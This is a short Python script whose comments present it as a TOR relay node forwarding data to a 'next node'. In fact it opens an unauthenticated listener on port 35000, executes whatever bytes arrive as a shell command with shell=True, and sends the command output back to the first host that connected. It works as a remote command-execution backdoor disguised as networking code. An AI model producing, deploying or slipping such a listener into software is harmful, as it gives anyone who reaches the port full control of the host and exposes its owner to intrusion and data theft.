from socket import *
import subprocess

REQ_PORT = 35000            # Port for TOR connections
RES_PORT = 35001
FORWARD_TO = None

initial_address = []

def execute_command(cmd):
    output = subprocess.check_output(cmd, shell=True)
    output = output.decode('utf-8')
    output = output.encode('ISO-8859-1')
    return output


def accept_connection(check):
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(('', REQ_PORT))
        sock.listen()
        while True:
            conn, addr = sock.accept()
            initial_address.append(addr[0])
            print("Connection accepted from:", addr)
            while True:
                # Receive data from client
                data = conn.recv(1024)
                if not data:
                    break
                # Send data to next node
                if check == 'incoming':
                    # new_data = b'new_data'
                    new_data = execute_command(data)
                    print("Sending new data: ", new_data)
                    send_msg(new_data, initial_address[0], REQ_PORT)


def send_msg(msg, host, port):
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect((host, port))
        sock.send(msg)
        sock.shutdown(SHUT_WR)

accept_connection('incoming')